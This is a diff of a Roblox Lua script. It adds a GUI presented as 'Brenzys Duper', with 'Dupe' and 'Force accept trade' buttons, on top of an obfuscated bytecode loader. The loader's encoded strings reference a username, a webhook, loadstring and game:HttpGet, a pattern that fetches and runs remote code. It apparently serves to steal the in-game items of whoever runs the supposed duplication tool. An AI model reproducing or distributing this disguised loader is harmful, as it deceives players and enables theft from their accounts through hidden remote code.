@@ -675,3 +675,98 @@ local function VMCall(ByteString, vmenv, ...)
 	return Wrap(Deserialize(), {}, vmenv)(...);
 end
 return VMCall("LOL!153O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00557365726E616D65030D3O00C3CCDF2BE3A2CC17DFC4D72CF203083O007EB1A3BB4586DBA703073O00576562682O6F6B03793O002BD93ED5EF798265C1F530CE25D7F86DCE25C8B322DD238AEB26CF22CAF328DE6594AE7B9C7392AE709C7B94A5719F7E95AD7B9965F4E42EFD27DDF92CE00DF2D374EF12E6D63AC63DE2A57BCE3BECFE10FB1DE3FF269C049DC576DF27FCC90CE10DEAD874C530DDAE77EB38C0EF2BFD24F6EC019D7ED2FD1903053O009C43AD4AA5030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403493O003CA35D06AF7C097BA54801F2214F20BF5C14A9354326B44618A8234820F94A19B169753AB85E0F8A720902BB4604AC154526BE5902AF694B35BE475989086F02927B259D0A0838A24803073O002654D72976DC46002C4O00207O00122O000100013O00202O00010001000200122O000200013O00202O00020002000300122O000300013O00202O00030003000400122O000400053O00062O0004000B000100010004033O000B000100121C000400063O00201F00050004000700121C000600083O00201F00060006000900121C000700083O00201F00070007000A00060B00083O000100062O001E3O00074O001E3O00014O001E3O00054O001E3O00024O001E3O00034O001E3O00064O0011000900083O00122O000A000C3O00122O000B000D6O0009000B000200122O0009000B6O000900083O00122O000A000F3O00122O000B00106O0009000B000200122O0009000E3O00121C000900113O001207000A00123O00202O000A000A00134O000C00083O00122O000D00143O00122O000E00156O000C000E6O000A8O00093O00024O0009000100016O00013O00013O00023O00026O00F03F026O00704002264O000200025O00122O000300016O00045O00122O000500013O00042O0003002100012O000A00076O000F000800026O000900016O000A00026O000B00036O000C00046O000D8O000E00063O00202O000F000600014O000C000F6O000B3O00024O000C00036O000D00046O000E00016O000F00016O000F0006000F00102O000F0001000F4O001000016O00100006001000102O00100001001000202O0010001000014O000D00106O000C8O000A3O000200202O000A000A00024O0009000A6O00073O000100040D0003000500012O000A000300054O001E000400024O0014000300044O001B00036O00183O00017O00", GetFEnv(), ...);
+
+-- // GUI TO LUA \\ --
+
+-- // INSTANCES: 11 | SCRIPTS: 0 | MODULES: 0 \\ --
+
+local UI = {}
+
+-- // StarterGui.ScreenGui \\ --
+UI["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))
+UI["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
+
+-- // StarterGui.ScreenGui.Frame \\ --
+UI["2"] = Instance.new("Frame", UI["1"])
+UI["2"]["BorderSizePixel"] = 0
+UI["2"]["BackgroundColor3"] = Color3.fromRGB(42, 42, 42)
+UI["2"]["Size"] = UDim2.new(0.52211, 0, 0.5426, 0)
+UI["2"]["Position"] = UDim2.new(0.23775, 0, 0.22842, 0)
+UI["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+
+-- // StarterGui.ScreenGui.Frame.UIAspectRatioConstraint \\ --
+UI["3"] = Instance.new("UIAspectRatioConstraint", UI["2"])
+UI["3"]["AspectRatio"] = 1.71274
+
+-- // StarterGui.ScreenGui.Frame.UICorner \\ --
+UI["4"] = Instance.new("UICorner", UI["2"])
+
+
+-- // StarterGui.ScreenGui.Frame.UIGradient \\ --
+UI["5"] = Instance.new("UIGradient", UI["2"])
+UI["5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(0.009, Color3.fromRGB(72, 72, 72)),ColorSequenceKeypoint.new(0.263, Color3.fromRGB(83, 83, 83)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}
+
+-- // StarterGui.ScreenGui.Frame.TextLabel \\ --
+UI["6"] = Instance.new("TextLabel", UI["2"])
+UI["6"]["TextWrapped"] = true
+UI["6"]["BorderSizePixel"] = 0
+UI["6"]["TextScaled"] = true
+UI["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["6"]["TextSize"] = 14
+UI["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+UI["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["6"]["BackgroundTransparency"] = 1
+UI["6"]["Size"] = UDim2.new(0, 76, 0, 33)
+UI["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["6"]["Text"] = [[Brenzys Duper]]
+UI["6"]["Position"] = UDim2.new(0.38143, 0, 0.03594, 0)
+
+-- // StarterGui.ScreenGui.Frame.TextButton \\ --
+UI["7"] = Instance.new("TextButton", UI["2"])
+UI["7"]["BorderSizePixel"] = 0
+UI["7"]["TextSize"] = 14
+UI["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["7"]["BackgroundColor3"] = Color3.fromRGB(64, 64, 64)
+UI["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["7"]["Size"] = UDim2.new(0, 168, 0, 28)
+UI["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["7"]["Text"] = [[Dupe]]
+UI["7"]["Position"] = UDim2.new(0.24578, 0, 0.3504, 0)
+
+-- // StarterGui.ScreenGui.Frame.TextButton.UICorner \\ --
+UI["8"] = Instance.new("UICorner", UI["7"])
+
+
+-- // StarterGui.ScreenGui.Frame.TextButton \\ --
+UI["9"] = Instance.new("TextButton", UI["2"])
+UI["9"]["BorderSizePixel"] = 0
+UI["9"]["TextSize"] = 14
+UI["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["9"]["BackgroundColor3"] = Color3.fromRGB(64, 64, 64)
+UI["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["9"]["Size"] = UDim2.new(0, 167, 0, 27)
+UI["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["9"]["Text"] = [[Force accept trade]]
+UI["9"]["Position"] = UDim2.new(0.24878, 0, 0.63144, 0)
+
+-- // StarterGui.ScreenGui.Frame.TextButton.UICorner \\ --
+UI["a"] = Instance.new("UICorner", UI["9"])
+
+
+-- // StarterGui.ScreenGui.Frame.TextLabel \\ --
+UI["b"] = Instance.new("TextLabel", UI["2"])
+UI["b"]["TextWrapped"] = true
+UI["b"]["BorderSizePixel"] = 0
+UI["b"]["TextScaled"] = true
+UI["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["b"]["TextSize"] = 14
+UI["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+UI["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["b"]["BackgroundTransparency"] = 1
+UI["b"]["Size"] = UDim2.new(0, 188, 0, 23)
+UI["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["b"]["Text"] = [[If it doesnt work/ only dupe once wait for it to work or spame execute the script]]
+UI["b"]["Position"] = UDim2.new(0.21581, 0, 0.84345, 0)
+
+
+return UI["1"], require;
